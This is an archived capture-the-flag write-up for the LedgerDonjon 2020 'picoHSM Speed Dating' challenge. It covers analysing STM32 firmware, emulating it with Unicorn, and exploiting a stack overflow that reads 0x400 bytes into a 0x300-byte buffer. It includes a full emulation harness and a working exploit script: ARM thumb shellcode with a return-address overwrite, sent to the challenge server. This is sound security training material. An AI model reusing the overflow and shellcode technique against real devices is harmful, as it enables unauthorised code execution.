# picohsm-speed-dating

**CTF:** LedgerDonjon 2020  
**Category:** misc  
**Original writeup:** <https://blog.cryptohack.org/atmega-pwn-picohsm-donjon-ctf-writeup> — by **blog.cryptohack.org**. All credit goes to the original author; this is an archived copy.

---

picoHSM Speed Dating (100pts)

Looks like the brand new picoHSM is online. We don’t really know what this product is… Time to have a look, and see how far we can go! But first, have a look at the firmware binary we managed to steal. There are 10 boards available on the network at picohsm.donjon-ctf.io, on ports ranging from 8001 to 8010. Try to pick one. All boards are exactly the same. You may not be alone trying to play. If connection fails, the equipment is probably already busy… We also know the admin resets and reflashes the boards every 15 minutes. Finally, we captured a photo of this equipment… you’ll probably understand why this suffers poor performance…

Unicorn, I choose you

Looking for clues

In this first challenge, all we get is a picture of the hardware board, and the firmware for one of the two MCUs that are on the board. The MCU for which we have the firmware is an STM32 ARM chip that runs in thumb mode. The other MCU is an Atmel processor, that acts as a secure coprocessor that is only accessible over a usart interface. Connecting to the hardware and/or decompiling the firmware a bit, we observe what functionality this board offers us:

help - print the list of commands. info - print equipment info. getflag [DEBUGKEY] - you already know what this is for... pin - verify pin. encrypt [PIN] [KEYID] [HEX] - encrypt a data blob. decrypt [PIN] [KEYID] [HEX] - decrypt a data blob.

Let’s have a look at what these commands do exactly:

help : this simply outputs the above text

: this simply outputs the above text info : this prints out some stuff, but nothing that looks really interesting

: this prints out some stuff, but nothing that looks really interesting getflag : checks if debug mode is enabled (this is not the case initially) and validates our input, the DEBUGKEY , against a 32-bit integer stored in memory; if both check pass, it prints out a flag, resets debug mode to false and samples a new DEBUGKEY

: checks if debug mode is enabled (this is not the case initially) and validates our input, the , against a 32-bit integer stored in memory; if both check pass, it prints out a flag, resets debug mode to false and samples a new pin : sends our input to the secure MCU that checks if it’s valid

: sends our input to the secure MCU that checks if it’s valid encrypt : if the pin is correct, encrypts our data under a key id (in the range from 0 to 7); data must be a multiple of 16 bytes long; a key can be locked and make this operation fail

: if the pin is correct, encrypts our data under a key id (in the range from 0 to 7); data must be a multiple of 16 bytes long; a key can be locked and make this operation fail decrypt: the corresponding decryption operation

For this first challenge, we’ll have to target the most clearly visible flag, namely the one hiding behind a debug flag and a debug key. So we need to set the debug flag and either extract or modify the debug key. Or if we can get code execution, we can of course also just print out the flag for ourselves directly.

Your stack doesn’t care what architecture it’s running

Looking closer at how the connection and our input are handled, we quickly find a severe vulnerability in the handle_client function: only 0x300 bytes are reserved on the stack, while 0x400 are being read. This will clearly allow us to smash the stack, and since we’re dealing with an embedded system, there is no memory protection, so we can put shellcode on the stack and jump straight into it. With a little attention to how our input is parsed, we can just add enough “arguments” in our input before the shellcode, to make sure that spaces are not overwritten by nullbytes.

And this is where we start to get annoyed a bit: since the chip is a custom board and needs to interact with the other hardware (setting up networking, communicating over the usart, …), we can’t just run it in qemu. Since we didn’t feel like blindly trying shellcode and manually computing stack addresses (not knowing there were two followup challenges at the time), we stopped working on this challenge for a while. After discovering there were other challenges to follow this one, we started looking at this again, and then someone suggested we could try using unicorn to emulate the firmware. With some tweaks, we’d be able to ignore or emulate other hardware directly in our host program.

Galloping though an ARM binary

I decided to give it a try with the python bindings to unicorn and try to extract the address where we can find the input buffer we control. Note that I will present the version of my emulator as it ended up after several improvements and gradual changes that also happened while solving the followup challenges.

First we do some setup with the help of pwntools to read information from the firmware. The binary contains the symbol stack_top (which is in the right location to indeed be the starting value of the stack according to the documentation of the MCU) which we will use in our initialization too. Most of the memory allocations are simply the result of emulating the firmware until an error occured, and observing what memory it tried to access.

from unicorn import * from unicorn.arm_const import * from pwn import * context . binary = exe = ELF ( "./firmware-mcu.elf" ) context . arch = "thumb" # This wasn't handled automatically and is very useful for `asm` and `disasm` STACK_SIZE = 1024 ** 2 # Some size we choose here, it worked, so it's good enough :) assert STACK_SIZE > len ( exe . data ) mu = Uc ( UC_ARCH_ARM , UC_MODE_THUMB ) mu . mem_map ( exe . load_addr , STACK_SIZE ) mu . mem_write ( exe . load_addr , exe . get_segment_for_address ( exe . load_addr ). data ()) mu . mem_map ( exe . sym [ "stack_top" ] - STACK_SIZE , STACK_SIZE ) mu . reg_write ( UC_ARM_REG_SP , exe . sym [ "stack_top" ]) mu . mem_map ( 0xe000e000 , STACK_SIZE ) mu . mem_map ( 0x40000000 , STACK_SIZE ) mu . mem_map ( 0x50060000 , STACK_SIZE )

Now that we’ve prepared unicorn to start emulating, we can start preparing some utilities to hook and patch the binary where needed.

payload = "help" # What you'd send as input goes here def printreg ( mu , regn , reg ): """Print the register name and the current value (in hex) to help in debugging""" info ( f "r { regn } : 0x { mu . reg_read ( reg ) : x } " ) # These address will immediately return to `lr` and print out that the function was skipped function_skips = { 0x08000170 : "rand_u32" , 0x0800058c : "setup_network" , 0x08000836 : "usart_init" , 0x08000cae : "socket_t::socket_t" , 0x08000180 : "sec_reset" , 0x080008ec : "usart::flush" , 0x08000f30 : "socket_t::disconnect" , } def get_string ( mu , addr ): """Retrieve a string from memory, read starting at `addr` until a nullbyte is encountered""" r = b "" while b " \0 " not in r : r += mu . mem_read ( addr , 0x20 ) addr += 0x20 return r . split ( b " \0 " )[ 0 ] ok = False # We can use this to e.g. only start outputting executed instructions once a condition is met def hook ( mu , addr , sz , data ): global last , ok last = addr #sometims useful while debugging # Some hooks that are not just skips if addr == 0x08001038 : info ( f "printing { get_string ( mu , mu . reg_read ( UC_ARM_REG_R1 )) } " ) if mu . reg_read ( UC_ARM_REG_R0 ) != 0x20001fd8 : mu . emu_stop () return mu . reg_write ( UC_ARM_REG_PC , mu . reg_read ( UC_ARM_REG_LR )) return elif addr == 0x08000a0c : info ( f "debug { get_string ( mu , mu . reg_read ( UC_ARM_REG_R0 )) } " ) mu . reg_write ( UC_ARM_REG_PC , mu . reg_read ( UC_ARM_REG_LR )) return elif addr in function_skips : info ( "Skip " + function_skips [ addr ]) mu . reg_write ( UC_ARM_REG_PC , mu . reg_read ( UC_ARM_REG_LR )) return elif addr == 0x08000d00 : info ( "socket_t::listen" ) if mu . reg_read ( UC_ARM_REG_R0 ) != 0x20001fd8 : mu . emu_stop () return mu . reg_write ( UC_ARM_REG_R0 , 0x1337 ) mu . reg_write ( UC_ARM_REG_PC , mu . reg_read ( UC_ARM_REG_LR )) return elif addr == 0x08000ccc : info ( "socket_t::avail" ) if mu . reg_read ( UC_ARM_REG_R0 ) != 0x20001fd8 : mu . emu_stop () return mu . reg_write ( UC_ARM_REG_R0 , len ( payload )) mu . reg_write ( UC_ARM_REG_PC , mu . reg_read ( UC_ARM_REG_LR )) return elif addr == 0x08001018 : info ( "socket_t::read_avail" ) if mu . reg_read ( UC_ARM_REG_R0 ) != 0x20001fd8 : mu . emu_stop () return info ( f " > Reading 0x { mu . reg_read ( UC_ARM_REG_R2 ) : x } into 0x { mu . reg_read ( UC_ARM_REG_R1 ) : x } " ) info ( f " > { payload [ : mu . reg_read ( UC_ARM_REG_R2 )] } " ) mu . mem_write ( mu . reg_read ( UC_ARM_REG_R1 ), payload [: mu . reg_read ( UC_ARM_REG_R2 )]) mu . reg_write ( UC_ARM_REG_PC , mu . reg_read ( UC_ARM_REG_LR )) return elif addr == 0x080008fa : info ( "usart::tx" ) if mu . reg_read ( UC_ARM_REG_R0 ) != 0x20000000 : warning ( "Nononono" ) mu . emu_stop () return info ( f " > 0x { mu . reg_read ( UC_ARM_REG_R1 ) : x } ( { bytes ([ mu . reg_read ( UC_ARM_REG_R1 )]) } )" ) mu . reg_write ( UC_ARM_REG_PC , mu . reg_read ( UC_ARM_REG_LR )) return elif addr == 0x08000936 : info ( "usart::rx" ) if mu . reg_read ( UC_ARM_REG_R0 ) != 0x20000000 : warning ( "Nononono" ) mu . emu_stop () return mu . reg_write ( UC_ARM_REG_R0 , 42 ) mu . reg_write ( UC_ARM_REG_PC , mu . reg_read ( UC_ARM_REG_LR )) return elif addr == 0x08001054 : info ( f "delay: { mu . reg_read ( UC_ARM_REG_R0 ) } " ) # elif addr == SC_ADDR: # ok[0] = True if ok : info ( f "Instruction at 0x { addr : x } : { disasm ( mu . mem_read ( addr , sz )) } " ) if ok : printreg ( mu , 'lr' , UC_ARM_REG_LR ) mu . hook_add ( UC_HOOK_CODE , hook )

Now all that’s left is to actually start emulating at main and choose at which instruction to stop - in this case, somewhere once handle_client has returned.

try : mu . emu_start ( exe . sym [ "main" ] | 1 , 0x08000736 ) except Exception as e : print ( e ) # If something is crashing, you can access the state here again to investigate

You might have noticed in this previous code snippet that we choose the address main | 1 to start the execution. In unicorn, this doesn’t actually matter, but when executing on real hardware, this is a very important detail. Because we’re running in thumb mode, this should always be indicated by having the LSB of pc be 1. This is a 0 when running in “regular” ARM. Note that for purposes of hooking the code, unicorn always has this LSB reset to 0.

But does it run DOOM

Now that we can run and debug the firmware and our shellcode, all that’s left is to actually write some shellcode and execute whatever we want. A few things we should keep in mind while doing this:

We have some payload before the actual shellcode to avoid problems with the argument parsing

All addresses we jump to should be thumb addresses

We first should get back a handle on the socket, so that we can actually obtain output

To take care of that last point, we chose to extract the socket from the address on the stack where execute_command had temporarily stored it earlier. Even though it’s not technically on an “active” part of the stack anymore, we know it can’t have been overwritten yet anyway. Then we just prepare what the stack would look like at the moment execute_command would be printing the flag, set the return address to where handle_client would have returned, and just skip validating all that debug mode trouble.

# Skipping some `pwn template` stuff here BUFFER_ADDR = 0x20001cd0 shellcode = asm ( """ sub sp, sp, 0x33c pop {r4} add sp, sp, 0x338 mov r5, sp eor r9, r9, r9 orr r9, r9, 0x0800 lsl r9, r9, 8 orr r9, r9, 0x04 lsl r9, r9, 8 orr r9, r9, 0x0b eor lr, lr, lr orr lr, lr, 0x0800 lsl lr, lr, 8 orr lr, lr, 0x7 lsl lr, lr, 8 orr lr, lr, 0x25 push {r0, r1, r2, r4, r5, r6, r7, lr} bx r9 """ ) io = start () io . recvuntil ( "seconds..." ) initial = b 'help a a a a a a a a a ' SC_ADDR = BUFFER_ADDR + len ( initial ) io . send ( initial + shellcode + b ' ' * ( 0x304 - len ( initial ) - len ( shellcode )) + pack ( SC_ADDR | 1 )) io . stream ()

One final minor annoyance here was that for some reason sending newlines or leaving our sending socket open seemed to make the remote hardware hang. So we simply don’t send a newline, and implicitly close the sending half of the socket by using io.stream() . Our way of loading 32-bit constants into the shellcode is not the prettiest yet, but it was good enough at the time. During later iterations, this was improved somewhat.

Flag: CTF{Ju5t_A_W4rmUP}
